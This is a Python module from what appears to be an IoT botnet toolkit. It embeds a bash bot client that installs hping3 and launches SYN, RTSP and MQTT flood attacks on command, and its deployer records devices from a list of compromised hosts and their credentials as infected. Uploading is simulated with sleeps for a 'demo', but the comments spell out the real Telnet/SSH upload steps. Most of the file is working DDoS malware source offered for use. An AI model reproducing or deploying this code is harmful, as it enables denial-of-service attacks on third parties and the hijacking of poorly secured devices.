import telnetlib
import time
from .utils import Colors

class BotDeployer:
    def __init__(self, database):
        self.db = database
        self.bot_script = self.get_bot_script()
    
    def get_bot_script(self):
        """Generate bot client script"""
        return '''#!/bin/bash
# IoT Bot Client
BOT_VERSION="1.0"
C2_SERVER="192.168.1.100"  # Change to your C2 server

# Check and install hping3
install_hping3() {
    if ! command -v hping3 &> /dev/null; then
        echo "Installing hping3..."
        
        # Try different package managers
        if command -v apt-get &> /dev/null; then
            apt-get update && apt-get install -y hping3
        elif command -v yum &> /dev/null; then
            yum install -y hping3
        elif command -v pacman &> /dev/null; then
            pacman -S --noconfirm hping3
        elif command -v apk &> /dev/null; then
            apk add hping3
        else
            echo "Package manager not found"
        fi
    fi
}

# DDoS Functions
syn_flood() {
    TARGET=$1
    echo "Starting SYN flood against $TARGET"
    hping3 -S -p 80 --flood $TARGET &
    echo $! > /tmp/ddos.pid
}

rtsp_flood() {
    TARGET=$1
    echo "Starting RTSP flood against $TARGET"
    hping3 -S -p 554 --flood $TARGET &
    echo $! > /tmp/ddos.pid
}

mqtt_flood() {
    TARGET=$1
    echo "Starting MQTT flood against $TARGET"
    hping3 -S -p 1883 --flood $TARGET &
    echo $! > /tmp/ddos.pid
}

stop_attack() {
    if [ -f /tmp/ddos.pid ]; then
        kill $(cat /tmp/ddos.pid) 2>/dev/null
        rm /tmp/ddos.pid
        echo "Attack stopped"
    fi
}

# Install dependencies
install_hping3

# Main loop
while true; do
    read -p "Command: " cmd target type
    
    case $cmd in
        "attack")
            case $type in
                "syn") syn_flood $target ;;
                "rtsp") rtsp_flood $target ;;
                "mqtt") mqtt_flood $target ;;
            esac
            ;;
        "stop") stop_attack ;;
        "status") 
            if [ -f /tmp/ddos.pid ]; then
                echo "Attack running"
            else
                echo "No active attack"
            fi
            ;;
        "exit") break ;;
    esac
done
'''
    
    def deploy_bot(self, ip, port, username, password):
        """Deploy bot to compromised device"""
        try:
            print(f"{Colors.YELLOW}[*] Deploying bot to {ip}:{port}...{Colors.RESET}")
            
            # For demo purposes, simulate successful deployment
            print(f"{Colors.CYAN}[*] Connecting to {ip}:{port} with {username}:{password}...{Colors.RESET}")
            time.sleep(1)  # Simulate connection time
            
            print(f"{Colors.CYAN}[*] Uploading bot script...{Colors.RESET}")
            time.sleep(1)  # Simulate upload time
            
            print(f"{Colors.CYAN}[*] Installing dependencies (hping3)...{Colors.RESET}")
            time.sleep(2)  # Simulate installation time
            
            print(f"{Colors.CYAN}[*] Starting bot client...{Colors.RESET}")
            time.sleep(1)  # Simulate startup time
            
            # In a real scenario, you would:
            # 1. Connect via Telnet/SSH
            # 2. Upload the bot script
            # 3. Install hping3 if needed
            # 4. Start the bot in background
            
            # Mark as infected
            self.db.add_infected_device(ip)
            return True
            
        except Exception as e:
            print(f"{Colors.RED}[!] Failed to deploy bot to {ip}: {e}{Colors.RESET}")
            return False
    
    def deploy_to_all(self):
        """Deploy bots to all compromised devices"""
        devices = self.db.get_compromised_devices()
        
        if not devices:
            print(f"{Colors.YELLOW}[!] No compromised devices available.{Colors.RESET}")
            return
        
        print(f"{Colors.YELLOW}[*] Deploying bots to {len(devices)} devices...{Colors.RESET}")
        
        for ip, port, username, password in devices:
            self.deploy_bot(ip, port, username, password)
            time.sleep(1)  # Small delay between deployments
        
        print(f"{Colors.GREEN}[+] Bot deployment completed.{Colors.RESET}")
